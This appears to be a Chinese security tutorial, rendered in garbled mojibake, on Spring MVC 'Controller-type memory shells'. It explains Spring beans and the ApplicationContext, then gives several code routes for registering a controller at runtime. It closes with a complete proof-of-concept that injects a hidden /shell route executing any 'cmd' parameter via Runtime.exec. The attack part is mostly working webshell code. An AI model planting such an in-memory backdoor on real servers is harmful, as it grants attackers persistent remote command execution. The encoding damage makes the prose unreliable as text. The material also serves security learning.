·ä¸€ä¸ªåœºæ™¯ï¼Œå‡å¦‚è®©æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨å®ç°ä¸€ä¸ªç®€æ˜“çš„WebæœåŠ¡å™¨ï¼Œæˆ‘ä»¬ä¼šæ€ä¹ˆåšï¼Ÿ é¦–å…ˆæˆ‘ä»¬è‚¯å®šè¦æ¥æ”¶å®¢æˆ·ç«¯å‘æ¥çš„TCPæ•°æ®åŒ…ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªTCPServeræ¥ç›‘å¬80ç«¯å£ã€‚æ¥ç€æˆ‘ä»¬éœ€è¦å°†TCPæ•°æ®åŒ…è§£ææˆHTTPåè®®ï¼Œè·å–URLè·¯å¾„ã€å‚æ•°åˆ—è¡¨ç­‰æ•°æ®ä¿¡æ¯ã€‚å†ç„¶åå°±æ˜¯æ‰§è¡Œå„ç§é€»è¾‘å¤„ç†ã€‚æœ€åå°±æ˜¯æŠŠå¤„ç†çš„ç»“æœå°è£…æˆHTTPåè®®è¿”å›ç»™æµè§ˆå™¨ï¼Œå¹¶ä¸”ç­‰æµè§ˆå™¨æ”¶åˆ°å“åº”åæ–­å¼€è¿æ¥ã€‚ä»¥ä¸Šå°±æ˜¯ä¸€ä¸ªç®€æ˜“WebæœåŠ¡å™¨çš„å®ç°é€»è¾‘ï¼Œå½“ç„¶ï¼ŒçœŸæ­£çš„WebæœåŠ¡å™¨å¯èƒ½è¦æ¯”ä¸Šè¿°æ›´åŠ å¤æ‚ä¸€äº›ï¼Œä½†æ ¸å¿ƒåŠŸèƒ½æ˜¯ä¸å˜çš„ï¼šæ¥å—è¯·æ±‚ã€å¤„ç†è¯·æ±‚ã€è¿”å›å“åº” å½“ç„¶ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å¤„ç†ä¸šåŠ¡æ—¶æ¯æ¬¡éƒ½è¦è¿›è¡Œä¸€éä¸Šè¿°æµç¨‹ï¼Œè¿™æœªå…å¤ªç¹çã€‚å…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ä¸Šè¿°æµç¨‹ä¸­ï¼Œç½‘ç»œé€šä¿¡ã€HTTPåè®®è§£æå’Œå°è£…éƒ¨åˆ†çš„å®ç°éƒ½ç›¸å¯¹å›ºå®šã€‚æœ‰å˜åŒ–çš„éƒ¨åˆ†å…¶å®åªæœ‰é€»è¾‘å¤„ç†å™¨ï¼Œéœ€è¦æˆ‘ä»¬æ ¹æ®ä¸åŒè¯·æ±‚åŒ…è€Œåšå‡ºç›¸åº”çš„é€»è¾‘å¤„ç†ã€‚å› æ­¤ï¼Œä¸ºäº†æé«˜å¼€å‘æ•ˆç‡ï¼Œæˆ‘ä»¬èƒ½ä¸èƒ½å°†ä¸å˜çš„éƒ¨åˆ†å°è£…èµ·æ¥å‘¢ï¼Ÿè¿™å…¶å®å°±æ˜¯æˆ‘ä»¬çš„WebæœåŠ¡å™¨ã€‚ Tomcatå°±æ˜¯è¿™æ ·ä¸€ç§æœåŠ¡å™¨ï¼Œå®ƒå…¶å®å°±æ˜¯ä¸€ä¸ªèƒ½å¤Ÿç›‘å¬TCPè¿æ¥è¯·æ±‚ï¼Œè§£æHTTPæŠ¥æ–‡ï¼Œå°†è§£æç»“æœä¼ ç»™å¤„ç†é€»è¾‘å™¨ã€æ¥æ”¶å¤„ç†é€»è¾‘å™¨çš„è¿”å›ç»“æœå¹¶é€šè¿‡TCPè¿”å›ç»™æµè§ˆå™¨çš„ä¸€ä¸ªæ¡†æ¶ã€‚åœ¨Tomcatå„ç§ç»„ä»¶ä¸­ï¼ŒConnnectorå°±æ˜¯è´Ÿè´£ç½‘ç»œé€šä¿¡çš„ï¼Œè€ŒContainerä¸­çš„Servletå°±æ˜¯æˆ‘ä»¬çš„é€»è¾‘å¤„ç†å™¨ å› æ­¤Tomcatå°±æ˜¯ä¸€ä¸ªServletå®¹å™¨ï¼Œå®ƒå°†å‰åç«¯äº¤äº’è¿‡ç¨‹ä¸­ä¸å˜çš„ä¸œè¥¿ï¼ˆç½‘ç»œé€šä¿¡ã€åè®®è§£æç­‰ï¼‰å°è£…äº†èµ·æ¥ã€‚è€ŒServletæ˜¯ä¸€ä¸ªé€»è¾‘å¤„ç†å™¨ï¼Œå®ƒå¯ä»¥è¢«Tomcatåˆ›å»ºã€è°ƒç”¨å’Œé”€æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬çš„Webç¨‹åºæ ¸å¿ƒæ˜¯åŸºäºServletçš„ï¼Œè€ŒWebç¨‹åºçš„å¯åŠ¨ä¾é Tomcat é‚£Spring MVCå‘¢ï¼ŸSpringæ˜¯åˆ©ç”¨æ³¨è§£ã€åå°„å’Œæ¨¡æ¿ç­‰æŠ€æœ¯å®ç°çš„ä¸€ç§æ¡†æ¶ã€‚å…¶æ ¸å¿ƒç±»æ˜¯ç»§æ‰¿äºHttpServletçš„DispatchServletã€‚é‚£æ—¢ç„¶æ˜¯Servletï¼Œé‚£è´Ÿè´£çš„è‚¯å®šå°±æ˜¯é€»è¾‘å¤„ç†éƒ¨åˆ†äº†ï¼Œé‚£ä¹ˆå°±éœ€è¦Tomcatè¿™æ ·çš„æœåŠ¡å™¨æ¥ç»™Springæä¾›è¿è¡Œç¯å¢ƒ Spring MVCspring MVCçš„è¿è¡Œæµç¨‹å¦‚ä¸‹ å®¢æˆ·ç«¯å‘é€Requestï¼ŒDispatcherServlet(ç­‰åŒäºControlleræ§åˆ¶å™¨)ï¼Œæ§åˆ¶å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ¥åˆ°HandlerMappingï¼ˆåœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®ï¼‰ï¼ŒHandlerMappingä¼šå¯¹URLè¿›è¡Œè§£æï¼Œå¹¶åˆ¤æ–­å½“å‰URLè¯¥äº¤ç»™å“ªä¸ªControlleræ¥å¤„ç†ï¼Œæ‰¾åˆ°å¯¹åº”çš„Controllerä¹‹åï¼ŒControllerå°±è·ŸServerã€JavaBeanè¿›è¡Œäº¤äº’ï¼Œå¾—åˆ°æŸä¸€ä¸ªå€¼ï¼Œå¹¶è¿”å›ä¸€ä¸ªè§†å›¾ï¼ˆModelAndViewè¿‡ç¨‹ï¼‰ï¼ŒDispathcheré€šè¿‡ViewResolverè§†å›¾è§£æå™¨,æ‰¾åˆ°ModelAndViewå¯¹è±¡æŒ‡å®šçš„è§†å›¾å¯¹è±¡,æœ€åï¼Œè§†å›¾å¯¹è±¡è´Ÿè´£æ¸²æŸ“è¿”å›ç»™å®¢æˆ·ç«¯ åˆ›å»ºä¸€ä¸ªç®€å•çš„springmvcé¡¹ç›® å¯ç›´æ¥çœ‹è¯¥æ–‡ç« æ¥æ­å»ºï¼šhttps://goodapple.top/archives/1355 æ–‡ç« é‡Œé¢è¯´çš„æ­å»ºmavené¡¹ç›®ï¼Œå»ºè®®é€‰æ‹©å¦‚ä¸‹ï¼Œè¾ƒä¸ºç®€å•ï¼š é…ç½®å®Œä¹‹åå¯åŠ¨tomcatï¼Œè®¿é—®helloè·¯ç”± ä¸Šé¢ç¯å¢ƒæ­å»ºæ˜¯æ­å»ºï¼Œä½†æ˜¯ä¸‹é¢å­¦ä¹ springå†…å­˜é©¬è¿˜æ˜¯é€šè¿‡springbootæ„å»ºé¡¹ç›®ï¼Œjavaç‰ˆæœ¬ä¸º8u65ï¼Œè¦è®°å¾—å‹¾é€‰springweb Controllerå‹å†…å­˜é©¬åŸºç¡€æ¦‚å¿µä¸€ã€Spring Beanï¼ˆä¸‹é¢ç®€ç§°ä¸ºâ€œBeanâ€ï¼‰ å®šä¹‰ï¼š åœ¨Springä¸­ï¼Œæ„æˆåº”ç”¨ç¨‹åºä¸»å¹²å¹¶ç”±Spring IoCå®¹å™¨ç®¡ç†çš„å¯¹è±¡ç§°ä¸ºbeanã€‚beanæ˜¯ç”±Spring IoCå®¹å™¨å®ä¾‹åŒ–ã€ç»„è£…å’Œç®¡ç†çš„å¯¹è±¡ã€‚Spring Beanä»£è¡¨ç€Springä¸­æœ€å°çš„æ‰§è¡Œå•ä½ï¼Œå…¶åŠ è½½ã€ä½œç”¨åŸŸã€ç”Ÿå‘½å‘¨æœŸçš„ç®¡ç†éƒ½ç”±Springæ“ä½œã€‚ ä¸ºä»€ä¹ˆéœ€è¦Beanï¼š å¯ä»¥å°†Spring IoCå®¹å™¨ç±»æ¯”ä¸ºä¸€ä½é«˜æ•ˆçš„â€œç®¡å®¶â€ï¼Œè€ŒBeanå°±æ˜¯è¿™ä½ç®¡å®¶ä¸ºä½ å‡†å¤‡çš„ä¸€åˆ‡èµ„æºå’ŒæœåŠ¡ã€‚ä½œä¸ºç¨‹åºå‘˜ï¼Œä½ åªéœ€è¦å£°æ˜ä½ éœ€è¦ä»€ä¹ˆï¼ˆå³æ³¨å…¥æŸä¸ªBeanï¼‰ï¼ŒSpringå°±ä¼šè´Ÿè´£å°†å…¶å‡†å¤‡å¥½å¹¶äº¤ä»˜ç»™ä½ ä½¿ç”¨ã€‚è‡³äºè¿™ä¸ªBeanæ˜¯å¦‚ä½•åˆ›å»ºã€é…ç½®ã€å­˜æ”¾çš„ï¼Œå¼€å‘è€…æ— éœ€å…³å¿ƒï¼ŒSpringéƒ½å·²æ›¿ä½ æ‰“ç†å¦¥å½“ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“çŸ¥é“Beanæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š bean æ˜¯å¯¹è±¡ bean è¢« IoC å®¹å™¨ç®¡ç† Spring åº”ç”¨ä¸»è¦æ˜¯ç”±ä¸€ä¸ªä¸ªçš„ bean æ„æˆçš„ äºŒã€Spring IOCå®¹å™¨ï¼ˆä¸‹é¢ç®€ç§°ä¸ºâ€œIocå®¹å™¨â€ï¼‰ å®šä¹‰ï¼š æ§åˆ¶åè½¬è‹±æ–‡å…¨ç§°ï¼šInversion of Controlï¼Œç®€ç§°å°±æ˜¯IoCã€‚æ§åˆ¶åè½¬é€šè¿‡ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰æ–¹å¼å®ç°å¯¹è±¡ä¹‹é—´çš„æ¾è€¦åˆå…³ç³»ã€‚ç¨‹åºè¿è¡Œæ—¶ï¼Œä¾èµ–å¯¹è±¡ç”±è¾…åŠ©ç¨‹åºåŠ¨æ€ç”Ÿæˆå¹¶æ³¨å…¥åˆ°è¢«ä¾èµ–å¯¹è±¡ä¸­ï¼ŒåŠ¨æ€ç»‘å®šä¸¤è€…çš„ä½¿ç”¨å…³ç³»ã€‚Spring IoCå®¹å™¨å°±æ˜¯è¿™æ ·çš„è¾…åŠ©ç¨‹åºï¼Œå®ƒè´Ÿè´£å¯¹è±¡çš„ç”Ÿæˆå’Œä¾èµ–çš„æ³¨å…¥ï¼Œç„¶åå†äº¤ç”±æˆ‘ä»¬ä½¿ç”¨ã€‚ ä¸ºä»€ä¹ˆéœ€è¦Iocå®¹å™¨ï¼š åœ¨å®é™…å¼€å‘ä¸­ï¼ŒBeanä¹‹é—´å¾€å¾€å­˜åœ¨ä¾èµ–å…³ç³»ï¼Œå®ƒä»¬å¹¶ä¸æ˜¯å­¤ç«‹å­˜åœ¨çš„ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªAå¯¹è±¡åœ¨å·¥ä½œæ—¶ï¼Œéœ€è¦ä¾èµ–Bå’ŒCå¯¹è±¡æä¾›æ”¯æŒã€‚å¦‚æœç”±Aè‡ªå·±å»åˆ›å»ºBå’ŒCï¼Œä¸ä»…éº»çƒ¦ï¼Œè¿˜ä¼šå¯¼è‡´ç»„ä»¶ä¹‹é—´è€¦åˆç´§å¯†ï¼Œéš¾ä»¥ç»´æŠ¤å’Œæµ‹è¯•ã€‚è¿™æ—¶ï¼ŒIoCå®¹å™¨å°±æ´¾ä¸Šç”¨åœºäº†ï¼Œå®ƒä¼šåœ¨åˆ›å»ºAå¯¹è±¡æ—¶ï¼Œè‡ªåŠ¨å…ˆåˆ›å»ºå®ƒæ‰€ä¾èµ–çš„Bå’ŒCå¯¹è±¡ï¼Œå†æŠŠå®ƒä»¬â€œæ³¨å…¥â€ç»™ Aã€‚è¿™æ ·ï¼ŒA å°±èƒ½é¡ºåˆ©å®Œæˆè‡ªå·±çš„åŠŸèƒ½ï¼Œè€Œä¸éœ€è¦å…³å¿ƒ B å’Œ C æ˜¯ä»å“ªå„¿æ¥çš„ã€æ€ä¹ˆåˆ›å»ºçš„ã€‚ IOCå®¹å™¨é€šè¿‡è¯»å–é…ç½®å…ƒæ•°æ®æ¥è·å–å¯¹è±¡çš„å®ä¾‹åŒ–ã€é…ç½®å’Œç»„è£…çš„æè¿°ä¿¡æ¯ã€‚é…ç½®çš„å…ƒæ•°æ®å¯ä»¥ç”¨xmlã€Javaæ³¨è§£æˆ–Javaä»£ç æ¥è¡¨ç¤ºã€‚ ä¸‰ã€ApplicationContext Springæ¡†æ¶ä¸­ï¼ŒBeanFactoryæ¥å£æ˜¯Spring IoCå®¹å™¨çš„å®é™…ä»£è¡¨è€…ã€‚ å®ç°äº†BeanFactoryæ¥å£çš„ApplicationContextæ¥å£ï¼Œæ˜¾ç„¶ä¹Ÿä»£è¡¨äº†IoCå®¹å™¨ã€‚å› æ­¤å¾—äº†ApplicationContextçš„å®ä¾‹ï¼Œå°±è·å¾—äº†IoCå®¹å™¨çš„å¼•ç”¨ã€‚æˆ‘ä»¬å¯ä»¥ä»ApplicationContextä¸­å¯ä»¥æ ¹æ®Beançš„IDè·å–Beanã€‚ æˆ‘ä»¬çš„æ“ä½œå¯¹è±¡æ˜¯Beanï¼Œå¦‚æœè¦è®¿é—®å’Œæ“ä½œbean ï¼Œä¸€èˆ¬è¦è·å¾—å½“å‰ä»£ç æ‰§è¡Œç¯å¢ƒçš„IoC å®¹å™¨ä»£è¡¨è€…ApplicationContextã€‚åœ¨Spring Webåº”ç”¨ä¸­ï¼Œé€šå¸¸å­˜åœ¨ä¸¤ä¸ªå±‚çº§çš„ ApplicationContextï¼š ä¸€ä¸ªRoot ApplicationContextï¼Œç”±ContextLoaderListeneråˆ›å»ºï¼Œç”¨äºç®¡ç†å…¨å±€å…±äº«Beanï¼ˆå¦‚Serviceã€Repositoryç­‰ï¼‰ï¼› ä¸€ä¸ªæˆ–å¤šä¸ªChild ApplicationContextï¼Œç”±DispatcherServletåˆ›å»ºï¼Œç”¨äºç®¡ç†ä¸Webå±‚ç›¸å…³çš„Beanï¼ˆå¦‚Controllerã€ViewResolverç­‰ï¼‰ã€‚ Child Contextå¯ä»¥è®¿é—®å…¶çˆ¶å®¹å™¨ï¼ˆRoot Contextï¼‰ä¸­çš„ Beanï¼Œä½†åè¿‡æ¥ä¸è¡Œã€‚æ‰€æœ‰çš„Contextåœ¨åˆ›å»ºåï¼Œéƒ½ä¼šè¢«ä½œä¸ºä¸€ä¸ªå±æ€§æ·»åŠ åˆ°äº†ServletContextä¸­ å››ã€ContextLoaderListener ContextLoaderListenerä¸»è¦è¢«ç”¨æ¥åˆå§‹åŒ–å…¨å±€å”¯ä¸€çš„Root Contextï¼Œå³Root WebApplicationContextã€‚è¿™ä¸ªRoot WebApplicationContextä¼šå’Œå…¶ä»–Child Contextå®ä¾‹å…±äº«å®ƒçš„IoCå®¹å™¨ï¼Œä¾›å…¶ä»–Child Contextè·å–å¹¶ä½¿ç”¨å®¹å™¨ä¸­çš„ bean å®ç°æ€è·¯å’ŒTomcatå†…å­˜é©¬ç±»ä¼¼ï¼Œæˆ‘ä»¬å°±éœ€è¦äº†è§£å¦‚ä½•åŠ¨æ€çš„æ³¨å†ŒControllerï¼Œæ€è·¯å¦‚ä¸‹ è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒ æ³¨å†Œæ¶æ„Controller é…ç½®è·¯å¾„æ˜ å°„ è·å¾—WebApplicationContextç¬¬ä¸€ç§æ–¹æ³•ï¼šgetCurrentWebApplicationContextWebApplicationContext context = ContextLoader.getCurrentWebApplicationContext(); è·å¾—çš„æ˜¯ä¸€ä¸ªXmlWebApplicationContextå®ä¾‹ç±»å‹çš„Root WebApplicationContextã€‚ ç¬¬äºŒç§æ–¹æ³•ï¼šWebApplicationContextUtilsWebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext()); é€šè¿‡è¿™ç§æ–¹æ³•è·å¾—çš„ä¹Ÿæ˜¯ä¸€ä¸ª Root WebApplicationContextã€‚å…¶ä¸­ WebApplicationContextUtils.getWebApplicationContext å‡½æ•°ä¹Ÿå¯ä»¥ç”¨ WebApplicationContextUtils.getRequiredWebApplicationContextæ¥æ›¿æ¢ã€‚ ä½†æ˜¯åœ¨æˆ‘å½“å‰çš„ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯spring-web-5.2.23ï¼ŒRequestContextUtilsç±»ä¸å†å…·æœ‰getWebApplicationContextæ–¹æ³• ç¬¬ä¸‰ç§æ–¹æ³•ï¼šRequestContextUtilsä¸Šé¢è¯´äº†ï¼Œåœ¨æˆ‘å½“å‰çš„ç‰ˆæœ¬ï¼Œåªæœ‰findWebApplicationContextæ–¹æ³•ï¼š WebApplicationContext context2 = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); é€šè¿‡ServletRequestç±»çš„å®ä¾‹æ¥è·å¾—Child WebApplicationContextã€‚ ç¬¬å››ç§æ–¹æ³•ï¼šgetAttributeWebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(org.springframework.web.servlet.DispatcherServlet.CONTEXT, 0); åŠ¨æ€æ³¨å†ŒControlleræ«ç¥è¿™æ®µè®²çš„å¤ªå¥½äº†ï¼Œç›´æ¥ç…§æ¬ Spring Controllerçš„åŠ¨æ€æ³¨å†Œï¼Œå°±æ˜¯å¯¹RequestMappingHandlerMappingæ³¨å…¥çš„è¿‡ç¨‹ã€‚ RequestMappingHandlerMappingæ˜¯SpringMVCé‡Œé¢çš„æ ¸å¿ƒBeanï¼ŒSpringæŠŠæˆ‘ä»¬çš„controllerè§£ææˆRequestMappingInfoå¯¹è±¡ï¼Œç„¶åå†æ³¨å†Œè¿›RequestMappingHandlerMappingä¸­ï¼Œè¿™æ ·è¯·æ±‚è¿›æ¥ä»¥åå°±å¯ä»¥æ ¹æ®è¯·æ±‚åœ°å€è°ƒç”¨åˆ°Controllerç±»é‡Œé¢äº†ã€‚ RequestMappingHandlerMappingå¯¹è±¡æœ¬èº«æ˜¯Springæ¥ç®¡ç†çš„ï¼Œå¯ä»¥é€šè¿‡ApplicationContextå–åˆ°ï¼Œæ‰€ä»¥å¹¶ä¸éœ€è¦æˆ‘ä»¬æ–°å»ºã€‚ åœ¨SpringMVCæ¡†æ¶ä¸‹ï¼Œä¼šæœ‰ä¸¤ä¸ªApplicationContextï¼Œä¸€ä¸ªæ˜¯Spring IOCçš„ä¸Šä¸‹æ–‡ï¼Œè¿™ä¸ªæ˜¯åœ¨java webæ¡†æ¶çš„Listeneré‡Œé¢é…ç½®ï¼Œå°±æ˜¯æˆ‘ä»¬ç»å¸¸ç”¨çš„web.xmlé‡Œé¢çš„org.springframework.web.context.ContextLoaderListenerï¼Œç”±å®ƒæ¥å®ŒæˆIOCå®¹å™¨çš„åˆå§‹åŒ–å’Œbeanå¯¹è±¡çš„æ³¨å…¥ã€‚ å¦å¤–ä¸€ä¸ªæ˜¯ApplicationContextæ˜¯ç”±org.springframework.web.servlet.DispatcherServletå®Œæˆçš„ï¼Œå…·ä½“æ˜¯åœ¨org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()è¿™ä¸ªæ–¹æ³•åšçš„ã€‚è€Œè¿™ä¸ªè¿‡ç¨‹é‡Œé¢ä¼šå®ŒæˆRequestMappingHandlerMappingè¿™ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–ã€‚ Spring 2.5å¼€å§‹åˆ°Spring 3.1ä¹‹å‰ä¸€èˆ¬ä½¿ç”¨org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMappingæ˜ å°„å™¨ï¼› Spring 3.1å¼€å§‹åŠä»¥åä¸€èˆ¬å¼€å§‹ä½¿ç”¨æ–°çš„org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMappingæ˜ å°„å™¨æ¥æ”¯æŒ@Contollerå’Œ@RequestMappingæ³¨è§£ã€‚ registerMappingåœ¨Spring 4.0åŠä»¥åï¼Œå¯ä»¥ä½¿ç”¨registerMappingç›´æ¥æ³¨å†ŒrequestMapping // 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ beanRequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡Method method = (Class.forName(me.landgrey.SSOLogin).getDeclaredMethods())[0];// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€PatternsRequestCondition url = new PatternsRequestCondition(/hahaha);// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controllerRequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);r.registerMapping(info, Class.forName(æ¶æ„Controller).newInstance(), method); registerHandlerå‚è€ƒä¸Šé¢çš„HandlerMappingæ¥å£ç»§æ‰¿å…³ç³»å›¾ï¼Œé’ˆå¯¹ä½¿ç”¨DefaultAnnotationHandlerMappingæ˜ å°„å™¨çš„åº”ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒç»§æ‰¿çš„é¡¶å±‚ç±»org.springframework.web.servlet.handler.AbstractUrlHandlerMappingã€‚ åœ¨å…¶registerHandler()æ–¹æ³•ä¸­ protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException Assert.notNull(urlPath, URL path must not be null);\tAssert.notNull(handler, Handler object must not be null);\tObject resolvedHandler = handler;\t// Eagerly resolve handler if referencing singleton via name.\tif (!this.lazyInitHandlers handler instanceof String) String handlerName = (String) handler; ApplicationContext applicationContext = obtainApplicationContext(); if (applicationContext.isSingleton(handlerName)) resolvedHandler = applicationContext.getBean(handlerName); Object mappedHandler = this.handlerMap.get(urlPath);\tif (mappedHandler != null) if (mappedHandler != resolvedHandler) throw new IllegalStateException( Cannot map + getHandlerDescription(handler) + to URL path [ + urlPath + ]: There is already + getHandlerDescription(mappedHandler) + mapped.); else if (urlPath.equals(/)) if (logger.isTraceEnabled()) logger.trace(Root mapping to + getHandlerDescription(handler)); setRootHandler(resolvedHandler); else if (urlPath.equals(/*)) if (logger.isTraceEnabled()) logger.trace(Default mapping to + getHandlerDescription(handler)); setDefaultHandler(resolvedHandler); else this.handlerMap.put(urlPath, resolvedHandler); if (getPatternParser() != null) this.pathPatternHandlerMap.put(getPatternParser().parse(urlPath), resolvedHandler); if (logger.isTraceEnabled()) logger.trace(Mapped [ + urlPath + ] onto + getHandlerDescription(handler)); è¯¥æ–¹æ³•æ¥å—urlPathå‚æ•°å’Œhandlerå‚æ•°ï¼Œå¯ä»¥åœ¨this.getApplicationContext() è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸ºhandler å‚æ•°å€¼çš„bean, å°†urlå’Œcontrollerå®ä¾‹beanæ³¨å†Œåˆ°handlerMapä¸­ã€‚ // 1. åœ¨å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ³¨å†Œä¸€ä¸ªåä¸º dynamicController çš„ Webshell controller å®ä¾‹ beancontext.getBeanFactory().registerSingleton(dynamicController, Class.forName(me.landgrey.SSOLogin).newInstance());// 2. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— DefaultAnnotationHandlerMapping çš„å®ä¾‹ beanorg.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);// 3. åå°„è·å¾— registerHandler Methodjava.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(registerHandler, String.class, Object.class);m1.setAccessible(true);// 4. å°† dynamicController å’Œ URL æ³¨å†Œåˆ° handlerMap ä¸­m1.invoke(dh, /favicon, dynamicController); detectHandlerMethodså‚è€ƒä¸Šé¢çš„HandlerMappingæ¥å£ç»§æ‰¿å…³ç³»å›¾ï¼Œé’ˆå¯¹ä½¿ç”¨RequestMappingHandlerMappingæ˜ å°„å™¨çš„åº”ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒç»§æ‰¿çš„é¡¶å±‚ç±»org.springframework.web.servlet.handler.AbstractHandlerMethodMapping åœ¨å…¶detectHandlerMethodsæ–¹æ³•ä¸­ï¼š protected void detectHandlerMethods(Object handler) Class? handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass(); final Class? userType = ClassUtils.getUserClass(handlerType); SetMethod methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() public boolean matches(Method method) return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null; ); Iterator var6 = methods.iterator(); while(var6.hasNext()) Method method = (Method)var6.next(); T mapping = this.getMappingForMethod(method, userType); this.registerHandlerMethod(handler, method, mapping); æ–¹æ³•ä»…æ¥å—handlerå‚æ•°ï¼ŒåŒæ ·å¯ä»¥ this.getApplicationContext()è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸ºhandlerå‚æ•°å€¼çš„ bean, å¹¶æ³¨å†Œcontrollerçš„å®ä¾‹bean context.getBeanFactory().registerSingleton(dynamicController, Class.forName(æ¶æ„Controller).newInstance());org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(detectHandlerMethods, Object.class);m1.setAccessible(true);m1.invoke(requestMappingHandlerMapping, dynamicController); å®ç°æ¶æ„Controllerç”±äºæ˜¯åŠ¨æ€è·¯ç”±ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å®ç°æ–¹æ³•å³å¯ï¼Œæ¯”å¦‚ public class Controller_Shell\tpublic Controller_Shell() public void shell() throws IOException //è·å–request HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); Runtime.getRuntime().exec(request.getParameter(cmd)); å®Œæ•´POCpackage Test1;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import java.io.IOException;import java.lang.reflect.Method;@Controllerpublic class Controller_Controller @RequestMapping(/control1) public String Inject() throws Exception //è·å–å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒ WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(org.springframework.web.servlet.DispatcherServlet.CONTEXT, 0); //æ‰‹åŠ¨æ³¨å†ŒController // 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡ Method method = Controller_Shell.class.getDeclaredMethod(shell); // 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€ PatternsRequestCondition url = new PatternsRequestCondition(/shell); // 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰ RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, new Controller_Shell(), method); return forward:/index.html; public class Controller_Shell public Controller_Shell() public void shell() throws IOException //è·å–request HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); Runtime.getRuntime().exec(request.getParameter(cmd)); é¦–å…ˆè®¿é—®/control1è·¯ç”±ï¼Œç”±äºControlleré»˜è®¤ä¼šå°†ç»“æœäº¤ç»™Viewå¤„ç†ï¼Œè¿”å›å€¼é€šå¸¸ä¼šè¢«è§£ææˆä¸€ä¸ªé¡µé¢è·¯å¾„ï¼Œæ‰€ä»¥è¿™é‡Œä¼šæŠ¥404é”™è¯¯ ç„¶åè®¿é—®æˆ‘ä»¬å®šä¹‰æ¶æ„Controllerçš„è·¯ç”±/shellï¼Œå¹¶è¿›è¡Œgetä¼ å‚ 